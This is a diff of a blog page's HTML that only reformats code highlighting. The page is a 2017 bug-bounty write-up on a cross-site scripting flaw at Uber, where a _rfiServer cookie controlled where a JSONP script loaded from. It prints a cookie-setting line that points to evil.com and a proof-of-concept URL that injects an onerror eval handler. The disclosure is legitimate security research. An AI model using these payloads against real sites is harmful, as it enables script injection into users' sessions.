@@ -47,8 +47,9 @@
 		<main>
 			<div class="post-content">
 <div id="post">
-  <h1 align="center">Uber XSS via Cookie</h1>
-<p align="right" class="date">30 Aug 2017 - zhchbin</p>
+<h1 align="center">Uber XSS via Cookie</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">30 Aug 2017 - zhchbin</p>
 
 <p>   This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.</p>
 
@@ -56,15 +57,14 @@
 
 <p>   Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was jsonp, and my target domain was <code class="highlighter-rouge">https://get.uber.com</code>. Let’s look at what I had found at that time.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>idrCall: function() {
-    var a, b;
-    return this.idrCallPending ? void 0 : (this.log("making idr call"),
-    a = this.rfiServer ? this.rfiServer : "a.rfihub.com",
-    b = this.getProtocol() + "//" + a + "/idr.js",
-    this.jsonpGet(b, {}, this.idrCallback, "cmZpSWRJbkNhY2hl"),
-    this.idrCallPending = !0)
-},
-</code></pre></div></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">idrCall</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">;</span>
+    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">idrCallPending</span> <span class="p">?</span> <span class="k">void</span> <span class="mi">0</span> <span class="p">:</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"making idr call"</span><span class="p">),</span>
+    <span class="nx">a</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">rfiServer</span> <span class="p">?</span> <span class="k">this</span><span class="p">.</span><span class="nx">rfiServer</span> <span class="p">:</span> <span class="s2">"a.rfihub.com"</span><span class="p">,</span>
+    <span class="nx">b</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">getProtocol</span><span class="p">()</span> <span class="o">+</span> <span class="s2">"//"</span> <span class="o">+</span> <span class="nx">a</span> <span class="o">+</span> <span class="s2">"/idr.js"</span><span class="p">,</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonpGet</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="p">{},</span> <span class="k">this</span><span class="p">.</span><span class="nx">idrCallback</span><span class="p">,</span> <span class="s2">"cmZpSWRJbkNhY2hl"</span><span class="p">),</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">idrCallPending</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">)</span>
+<span class="p">},</span></code></pre></figure>
 
 <p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg" /></p>
 
@@ -74,9 +74,8 @@
 
 <p>After reading through these lines of code:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a = this.readCookie("_rfiServer"),
-null != a &amp;&amp; this.setRfiServer(a),
-</code></pre></div></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">a</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">readCookie</span><span class="p">(</span><span class="s2">"_rfiServer"</span><span class="p">),</span>
+<span class="kc">null</span> <span class="o">!=</span> <span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">setRfiServer</span><span class="p">(</span><span class="nx">a</span><span class="p">),</span></code></pre></figure>
 
 <p>   We could get the information that the initial value of <code class="highlighter-rouge">this.rfiServer</code> was set by using value of cookie <code class="highlighter-rouge">_rfiServer</code> if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:</p>
 
@@ -91,8 +90,7 @@ null != a &amp;&amp; this.setRfiServer(a),
 
 <p>   Any subdomain of uber.com can set cookie with domain <code class="highlighter-rouge">.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code class="highlighter-rouge">xxx.uber.com</code> using following code, then <code class="highlighter-rouge">get.uber.com</code> will use the cookie value.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
-</code></pre></div></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s1">'_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span></code></pre></figure>
 
 <p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg" /></p>
 
@@ -116,10 +114,9 @@ null != a &amp;&amp; this.setRfiServer(a),
   <li>The final PoC</li>
 </ol>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://&lt;redacted&gt;.uber.com/&lt;redacted&gt;?
-email=aaa"%20type%3d"image"%20src%3d1%20o&gt;nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))
-#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";
-</code></pre></div></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">https</span><span class="p">:</span><span class="c1">//&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span>
+<span class="nx">email</span><span class="o">=</span><span class="nx">aaa</span><span class="s2">"%20type%3d"</span><span class="nx">image</span><span class="s2">"%20src%3d1%20o&gt;nerror%3d"</span><span class="kr">eval</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span>
+<span class="err">#</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">'_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/'</span><span class="p">;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"https://get.uber.com"</span><span class="p">;</span></code></pre></figure>
 
 <p>Thanks for Uber. Reward: 5k</p>
 
